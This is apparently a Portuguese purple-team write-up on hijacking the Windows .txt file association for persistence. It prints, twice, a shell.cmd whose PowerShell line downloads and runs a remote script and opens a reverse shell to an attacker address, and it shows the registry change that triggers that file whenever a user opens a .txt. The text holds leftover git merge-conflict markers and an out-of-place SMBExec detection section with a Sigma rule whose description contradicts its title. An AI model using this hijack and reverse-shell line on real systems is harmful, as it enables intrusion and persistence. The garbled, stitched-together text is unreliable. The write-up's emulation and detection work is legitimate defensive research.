
<p align="center">
  <img src="./imagens/ISHLOGO.png" alt="Logo do Purple Team" width="300" height="300">
</p>

# CTI Purple Team - Execução Acionada por Evento: Alterar Associação de Arquivo Padrão 

<<<<<<< HEAD
Quando um arquivo é criado em um sistema operacional como o Windows, ele é automaticamente associado a um programa específico que será usado para abrir esse tipo de arquivo quando clicado duas vezes.

A execução acionada por evento permite que os usuários personalizem a maneira como os arquivos são abertos, definindo regras específicas para acionar a execução de aplicativos diferentes com base em diferentes eventos.

As seleções de associação de arquivos são armazenados no Registro do Windows e podem ser editados por usuários, administradores ou programas que tenham acesso ao Registro ou por administradores usando o utilitário associado.

Neste contexto, exploraremos os conceitos por trás da execução acionada por evento representando o sequestro da extenção ***.txt***, sendo possível executar um aplicativo malicioso antes que o arquivo real seja aberto, gerando um reverse shell na máquina do atacante.

## Contexto

Quando um arquivo ***.txt*** é clicado duas vezes, ele é aberto com um ***notepad.exe***. O windows por padrão sabe que para abrir esse tipo de extensão precisa usar o *notepad.exe*.

As associaçõs de arquivos do sistemas estão listadas em **HKEY_CLASSES_ROOT.[extention]**, no caso dessa pesquisa será listado em **HKEY_CLASSES_ROOT.txt**.

No entanto, é possível sequestrar chaves de registro que controlam o programa padrão para extensões específicas a fim de obter persistência.
=======
Quando um arquivo é criado em um sistema operacional como o Windows, ele é automaticamente associado a um programa específico que será usado para abrir esse tipo de arquivo quando clicado duas vezes. A execução acionada por evento permite que os usuários personalizem a maneira como os arquivos são abertos, definindo regras específicas para acionar a execução de aplicativos diferentes com base em diferentes eventos.

Neste contexto, exploraremos os conceitos por trás da execução acionada por evento representando o sequestro da extenção ***.txt***, sendo possível executar um aplicativo malicioso antes que o arquivo real seja aberto, gerando um reverse shell na máquina do atacante, a fim de obter persistência.

<p align="center">
  <img src="imagens/Fluxograma_ServiceExecution.png">
</p>

**A priori, para executar o sequestro de extensão, é importante salientar que o atacante já possua o primeiro acesso inicial à máquina alvo, com privilégios administrativos. Portando, já ter realizado a Execução e Escalação de Privilégios na vítima**.

## Contexto

Ao clicar duas vzes em um arquivo ***.txt***, ele é aberto com um ***notepad.exe***. O windows por padrão sabe que para abrir esse tipo de extensão precisa usar o *notepad.exe*.
>>>>>>> 01b2a00758a898126d20308d17ca269ef93a7549

As seleções de associação de arquivos são armazenados no Registro do Windows e estão listadas em **HKEY_CLASSES_ROOT.[extention]**, no caso dessa pesquisa será listado em **HKEY_CLASSES_ROOT.txt** e, podem ser editados por usuários, administradores ou programas que tenham acesso ao Registro ou por administradores usando o utilitário associado, desde que tenham elevação de privilégio de administrador. 

<<<<<<< HEAD
## Análise e Execução do código malicioso
=======
## Emulação de Ameaça - Criação de Arquivo Malicioso Através do ps.exe
>>>>>>> 01b2a00758a898126d20308d17ca269ef93a7549

Há dois locais de registro que definem os manipuladores de extensão, que são mostrados a seguir, e são classificados como: *Global* e *Local*.

<p align="center">
  <img src="imagens/locais-de-registro.png">
</p>

Quando um usuário tenta abrir um arquivo, o sistema operacional verifica os registros locais em (HKEY_CURRENT_USERS) para determinar qual programa está designado para lidar com aquela extensão de arquivo. Caso nao houver nenhuma entrada de registro associada, a verificação é feita na árvore de registro global (HKEY_CLASSES_ROOT).

Dependendo dos privilégios do usuário (Administrador ou Usuário Padrão), esses locais de registro podem ser explorados para executar código malicioso, utilizando o manipulador de extensão como um gatilho.

<<<<<<< HEAD
A priori, para executar o sequestro de extensão é necessário que o atacante já possua o primeiro acesso inicial à máquina alvo.

Portanto, podemos observar que o manipulador de extensão ***.txt*** está definido na chave de registro abaixo:

Computer\HKEY_CLASSES_ROOT\txtfile\shell\open\command ---- [***colocar botao de copiar***]

Abaixo exemplifico que o comando responsável por abrir arquivos *.txt* é o *notepad.exe %1*, onde o argumento *%1*, especifica um nome de arquivo qualquer, ou seja, é uma variante para o nome dos arquivos que o bloco de notas deve abrir:

<p align="center">
  <img src="imagens/Editor-de-registro-HKEY.png">
</p>

Supomos que o usuário alvo possua uma arquivo chamado ***test.txt*** em sua área de trabalho, contendo o conteúdo do arquivo ilustrado abaixo:

<p align="center">
  <img src="imagens/arquivo-vitima.png">
</p>

Iremos criar agora um arquivo malicioso que será executado quando o usuário alvo tentar abrir um arquivo chamado test.txt, sendo que com a execução desta têcnica pode ser qualquer arquivo aleatório, apenas seguindo o critério de extenção .txt usado como exemplo nesta pesquisa.

Para isso, criaremos um arquivo em lotes simples do Windows chamado ***shell.cmd*** na maquina do usuário alvo:

start notepad.exe %1
powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://192.168.140.128/purplecat.ps1');purplecat -c 192.168.140.128 -p 8081 -e cmd.exe"  ------- ***COLOCAR BOTAO DE COLAR***

A partir disso, podemos sequestrar a extensão do arquivo .txt, modificando os dados do valor de registro de: Computer\HKEY_CLASSES_ROOT\txtfile\shell\open\command para C:\Users\Win-test\Desktop\shell.cmd, local onde nosso arquivo malicioso está gravado.

<p align="center">
  <img src="imagens/mod.registro.png">
</p>

Após a modificação a chave de registro se encontrará da mesma maneira que a imagem abaixo:

<p align="center">
  <img src="imagens/modificado.png">
</p>

Na seção a seguir, vamos analisar como podemos executar detectar a execução desta ferramenta desenvolvida em *PowerShell*, e validar a reutilização de uma detecção já criada por meio da pesquisa do Purple Team, referente ao **PsExec**.

## Análise de Comportamento




Este, e as demais constantes observadas no código podem ser identificadas por meio do ***Event ID 4104***.

### Reutiização da Regra de Detecção do PsExec e de Criação de Serviços Maliciosos.

Como foi possível observar, se você leu ou assistiu ao [Webinar](https://ishtecnologia.sharepoint.com/:v:/s/CTI-PurpleTeam/EXxP0PKWVJlAuad4KmBTUoAB9P-aQ0ebrhlVtrFO5_ejWg?e=Pu4GpV) da pesquisa de Movimentação Lateral Através do PSExec, você já perecebeu que o fluxo de execução do *SMBExec* é semelhante ao fluxo de execução do PsExec.

Parte deste fluxo é o *logon com o tipo 3* ([**Event ID 4624**](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventid=4624)) e o acesso a escrita do compartilhamento oculto administrativo **IPC$**. Isso pode ser visto na imagem abaixo.

<p align="center">
  <img src="imagens/14.ipc_write_data.png">
</p>

Ou seja, de fato, é semelhante o suficiente para que a nossa regra de detecção [BASELINE - Lateral Movement - Possible Lateral Movement Through PSExec](https://github.com/ish-cti-purple/CTI-PurpleTeam/blob/main/Regras/Sigma/Lateral_Movement/BASELINE%20-%20Lateral%20Movement%20-%20Possible%20Lateral%20Movement%20Through%20PSExec.yml), possa ser utilizada para detectar o comportamento produzido no dispositivo vítima, ao sofrer a exploração da ferramenta ***SMBExec***.

Também é possível observar outro comportamento, no qual além de dar *match* com a sequência de comportamentos produzidos pelo *PsExec*, também pode ser detectado por outra regra de detecção desenvolvida por meio de uma das pesquisas do *Purple Team*. Esta regra foi um output da pesquisa de [***Criação de Serviços Maliciosos no Windows***](https://github.com/ish-cti-purple/CTI-PurpleTeam/blob/main/Pesquisas/ATT%26CK%20TTPs/%5BTA0003%5D%20Persistence/%5BT1543%5D%20Create%20or%20Modify%20System%20Process/%5BT1543.003%5D%20Create%20or%20Modify%20System%20Process%3A%20Windows%20Service/CTI%20Purple%20Team%20-%20Cria%C3%A7%C3%A3o%20de%20Servi%C3%A7os%20Maliciosos%20no%20Windows/%5BCTI%20Purple%20Team%5D%20Cria%C3%A7%C3%A3o%20de%20Servi%C3%A7os%20Maliciosos%20no%20Windows.md).

Esta pesquisa nos permite compreender como podemos detectar a criação de serviços maliciosos por meio dos Event IDs [**7045**](https://www.manageengine.com/products/active-directory-audit/kb/system-events/event-id-7045.html) e [**4697**](https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4697).

<p align="center">
  <img src="imagens/15.malicious_service_creation.png">
</p>

Foi implementado sa regra Sigma de todas as pesquisas citadas, e o resultado foi o match de cada aspecto da execução do ***SMBExec***.

<p align="center">
  <img src="imagens/14.ipc_write_data.png">
</p>

## Engenharia de Detecção

Para detectarmos a execução da ferramenta em PowerShell do SMBExec, nós confeccionamos a regra de detecção abaixo documentada no modelo Sigma.

```yaml
title: 000:1311431:000:TA0008.T1021.002:Possible Lateral Movement Through SMBExec
id: 77fba173-754b-4fdf-9271-3528648139fe
status: stable
description: 'Esta regra detecta o comportamento produzido pela execução do PSExec, para a realização de Movimentação Lateral.'
references:
    - 'https://attack.mitre.org/techniques/T1543/003'
    - 'https://attack.mitre.org/techniques/T1570/'
    - 'https://attack.mitre.org/techniques/T1021/002/'
    - 'https://attack.mitre.org/techniques/T1569/002/'
    - 'https://attack.mitre.org/techniques/T1550/002/'
author: CTI Purple Team
date: 2024/01/05
tags:
    - 'attack.persistence.T1543.003'
    - 'attack.lateral.movement.T1570'
    - 'attack.lateral.movement.T1021.002'
    - 'attack.execution.T1569.002'
    - 'attack.lateral.movement.T1550.002'
logsource:
    category: 'powershell_scriptblock_logging'
    product: 'windows'
detection:
    Message|contains:
        - '0xff,0x53,0x4d,0x42'
        - '0xfe,0x53,0x4d,0x42'
        - '0x5c,0x73,0x76,0x63,0x63,0x74,0x6c,0x00'
        - 'IPC$'
        - 'ADMIN$'
        - 'C$'
    condition: Message
fields:
    - PowerShell Script Block;
    - Computer Name.
falsepositives:
    - 'É necessário identificar realizar triagem de possíveis scripts que possam utilizar-se das mesmas capacidades, e que foram desenvolvidas pelos administradores de sistemas'
level: high
=======
Portanto, podemos observar que o manipulador de extensão ***.txt*** está definido na chave de registro abaixo:
```zsh
Computer\HKEY_CLASSES_ROOT\txtfile\shell\open\command
>>>>>>> 01b2a00758a898126d20308d17ca269ef93a7549
```

Abaixo exemplifico que o comando responsável por abrir arquivos *.txt* é o *notepad.exe %1*, onde o argumento *%1*, especifica um nome de arquivo qualquer, ou seja, é uma variante para o nome dos arquivos que o bloco de notas deve abrir:

<p align="center">
  <img src="imagens/Editor-de-registro-HKEY.png">
</p>

Supomos que o usuário alvo possua uma arquivo chamado ***test.txt*** em sua área de trabalho, contendo o conteúdo do arquivo ilustrado abaixo:

<p align="center">
  <img src="imagens/arquivo-vitima.png">
</p>

Iremos criar agora um arquivo malicioso que será executado quando o usuário alvo tentar abrir o arquivo chamado test.txt, sendo que com a execução desta têcnica pode ser qualquer arquivo aleatório, apenas seguindo o critério de extenção .txt usado como exemplo nesta pesquisa.

Para isso, criaremos um arquivo em lotes simples do Windows chamado ***shell.cmd*** na maquina do usuário alvo:
```zsh
start notepad.exe %1
powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://192.168.140.128/purplecat.ps1');purplecat -c 192.168.140.128 -p 8081 -e cmd.exe"
```

A partir disso, podemos sequestrar a extensão do arquivo .txt, modificando os dados do valor de registro de Computer\HKEY_CLASSES_ROOT\txtfile\shell\open\command para C:\Users\Win-test\Desktop\shell.cmd, local onde nosso arquivo malicioso está gravado.

<p align="center">
  <img src="imagens/mod.registro.png">
</p>

Após a modificação a chave de registro se encontrará da mesma maneira que a imagem a seguir:

<p align="center">
  <img src="imagens/modificado.png">
</p>

A seguir na máquina do atacante, iremos rodar dois comandos no terminal, um para baixar o arquivo aberto pelo usuário e outro para escutar a porta selecionada para sequestrar a sessão do sistema da vítima:

<p align="center">
  <img src="imagens/comando-para-baixar-arquivo.png">
</p>

O comando acima, baixa os arquivos .txt abertos pela vítima. E o comando abaixo utilizaremos o [*NetCat*](https://www.devmedia.com.br/netcat-o-canivete-suico-tcp-ip-revista-infra-magazine-8/26299#:~:text=O%20Netcat%2C%20criado%20em%202004,conectividade%2C%20seguran%C3%A7a%2C%20entre%20outros.) como Listener, ao ser iniciado irá ouvir qualquer conexão realizada na porta **8081/TCP**. 

<p align="center">
  <img src="imagens/comando-escustar-maquina-alvo.png">
</p>

Após realizar todos esses passos, quando o usuário alvo abrir qualquer arquivo .txt e executar o arquivo malicioso simultâneamente, a conexão será realizada com o *listener* na porta **8081/TCP**, mencionada acima.

![Gif-emulação](imagens/gif-emulação.gif)
